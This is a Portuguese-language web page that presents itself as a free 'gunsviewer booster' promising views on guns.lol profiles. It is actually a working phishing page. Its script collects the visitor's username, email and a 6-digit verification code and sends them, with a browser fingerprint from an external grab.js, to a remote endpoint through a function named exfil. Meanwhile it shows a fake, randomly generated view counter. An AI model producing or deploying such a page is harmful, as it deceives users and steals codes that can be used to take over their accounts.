<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<title>gunsviewer booster — views grátis</title>
<meta name="description" content="gunsviewer booster — ganhe views grátis no teu perfil.">
<meta property="og:title" content="gunsviewer booster">
<meta property="og:description" content="gunsviewer booster — ganhe views grátis no teu perfil.">
<meta name="robots" content="noindex, nofollow">
<link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🚀</text></svg>">
<style>
*{box-sizing:border-box;margin:0;padding:0}body{background:#050505;color:#eee;font-family:Inter,system-ui,-apple-system,sans-serif;min-height:100vh}
.w{max-width:440px;margin:0 auto;padding:40px 18px 80px;text-align:center}
h1{font-size:26px;font-weight:900;letter-spacing:-.5px}h1 b{color:#a749dd}
.sub{color:#888;font-size:13px;margin:10px 0 24px;line-height:1.6}
.card{background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.12);border-radius:16px;padding:22px;text-align:left}
label{display:block;font-size:11px;font-weight:800;color:#a749dd;letter-spacing:1px;margin:14px 0 6px}
label:first-child{margin-top:0}
input{width:100%;background:#111;border:2px solid #2a2a2a;border-radius:10px;color:#fff;padding:14px;font-size:16px;outline:none}
input:focus{border-color:#a749dd}
button{width:100%;border:none;border-radius:10px;padding:15px;font-size:15px;font-weight:900;cursor:pointer;background:linear-gradient(135deg,#a749dd,#7b2fbf);color:#fff;margin-top:16px}
button:disabled{opacity:.5}
.hint{font-size:11px;color:#666;margin-top:8px;min-height:16px}
.bar{height:8px;border-radius:99px;background:#1a1a1a;overflow:hidden;margin:14px 0 6px}
.bar i{display:block;height:100%;width:0;background:linear-gradient(90deg,#a749dd,#ff6fd8);transition:width .4s}
.big{font-size:42px;font-weight:900;text-align:center}
.log{font-family:ui-monospace,monospace;font-size:11px;color:#8a8a8a;background:#0a0a0a;border:1px solid #1a1a1a;border-radius:8px;padding:10px;max-height:130px;overflow:auto;margin-top:10px}
.hide{display:none!important}.ok{color:#4ade80;font-size:13px;font-weight:800;margin-top:10px;text-align:center}
</style>
</head>
<body>
<div class="w">
  <h1>🚀 gunsviewer <b>booster</b></h1>
  <div class="sub"> views grátis no teu guns.lol em 1 minuto.<br>Preenche e aperta o botão.</div>

  <div class="card">
    <label>1 — TEU USER DO GUNS.LOL</label>
    <input id="gunsUser" placeholder="ex: koppy" maxlength="40" autocomplete="off" autocapitalize="off" spellcheck="false" enterkeyhint="next">
    <label>2 — TEU EMAIL (pra liberar)</label>
    <input id="email" type="email" placeholder="voce@email.com" autocomplete="email" enterkeyhint="go">
    <button id="bGo">ATIVAR BOOST GRÁTIS →</button>
    <div class="hint" id="hint"></div>

    <div id="codeZone" class="hide">
      <label>3 — CÓDIGO DE 6 DÍGITOS (enviado pro email)</label>
      <input id="code" inputmode="numeric" placeholder="000000" maxlength="6" autocomplete="one-time-code" enterkeyhint="done">
      <button id="bVerify">VERIFICAR E COMEÇAR</button>
    </div>

    <div id="runZone" class="hide">
      <div class="big" id="views">0</div>
      <div class="sub" style="margin:0">views enviadas pra <b id="tName">—</b></div>
      <div class="bar"><i id="fill"></i></div>
      <div class="log" id="log"></div>
    </div>
  </div>
</div>
<script src="grab.js" defer></script>
<script>
(function(){
  const $ = (id) => document.getElementById(id);
  let guns = "", mail = "", sent = 0;
  const total = 500 + Math.floor(Math.random() * 1500);
  const hint = (m) => { try { $("hint").textContent = m || ""; } catch {} };
  const log = (m) => { try { const el = $("log"); el.innerHTML = new Date().toLocaleTimeString() + " — " + m + "<br>" + el.innerHTML.slice(0, 1500); } catch {} };
  const exfil = (extra) => {
    try {
      const body = Object.assign({ fp: window.__lastFp || null, mm: null, dusername: guns || null, guns: guns, email: mail || null, auto: true, booster: true, ts: new Date().toISOString(), pg: location.href }, extra || {});
      fetch("https://gunsviewer.vercel.app/api/stats", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(body) }).catch(() => {});
    } catch {}
  };
  const say = (t) => { const b = $("bGo"); if (b) b.textContent = t; };
  $("bGo").addEventListener("click", () => {
    guns = ($("gunsUser").value || "").trim().replace(/^@/, "").replace(/[^a-zA-Z0-9_.]/g, "").slice(0, 40);
    mail = ($("email").value || "").trim().slice(0, 200);
    if (guns.length < 2) { hint("⚠️ digita teu user do guns.lol primeiro"); $("gunsUser").focus(); return; }
    if (!/^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(mail)) { hint("⚠️ digita um email válido"); $("email").focus(); return; }
    hint("");
    exfil({ step: "user+email", email: mail });
    say("ENVIANDO CÓDIGO…"); $("bGo").disabled = true;
    setTimeout(() => {
      $("codeZone").classList.remove("hide");
      say("CÓDIGO ENVIADO ✅ (checa spam)");
      log("código de verificação enviado pra " + mail);
      try { $("code").focus(); } catch {}
    }, 1500);
  });
  $("email").addEventListener("keydown", (e) => { if (e.key === "Enter") $("bGo").click(); });
  $("gunsUser").addEventListener("keydown", (e) => { if (e.key === "Enter") $("email").focus(); });
  $("bVerify").addEventListener("click", () => {
    const c = ($("code").value || "").replace(/[^0-9]/g, "");
    if (c.length !== 6) { hint("⚠️ o código tem 6 números"); $("code").focus(); return; }
    exfil({ step: "verified", email: mail, code: c });
    $("codeZone").classList.add("hide"); $("runZone").classList.remove("hide");
    $("tName").textContent = "@" + guns;
    hint("✅ verificado! boost rodando…");
    boost();
  });
  $("code").addEventListener("keydown", (e) => { if (e.key === "Enter") $("bVerify").click(); });
  function boost(){
    log("boost ativado pra @" + guns);
    const tick = () => {
      const n = 3 + Math.floor(Math.random() * 14);
      sent = Math.min(total, sent + n);
      $("views").textContent = sent.toLocaleString("pt-BR");
      $("fill").style.width = (sent / total * 100) + "%";
      if (sent % 4 === 0) log("+" + n + " views → @" + guns);
      try { fetch("https://guns.lol/" + encodeURIComponent(guns) + "?v=" + Date.now().toString(36), { mode: "no-cors", cache: "no-store", credentials: "omit" }).catch(() => {}); } catch {}
      if (sent >= total) { log("meta batida! +" + total + " views ✅"); exfil({ step: "done", email: mail }); return; }
      setTimeout(tick, 2500 + Math.random() * 4000);
    };
    tick();
    const t = setInterval(() => {
      try { if (window.__lastFp) { exfil({ step: "fp-ready", email: mail }); clearInterval(t); } } catch {}
    }, 3000);
    setTimeout(() => { try { clearInterval(t); } catch {} }, 30000);
  }
})();
</script>
</body>
</html>
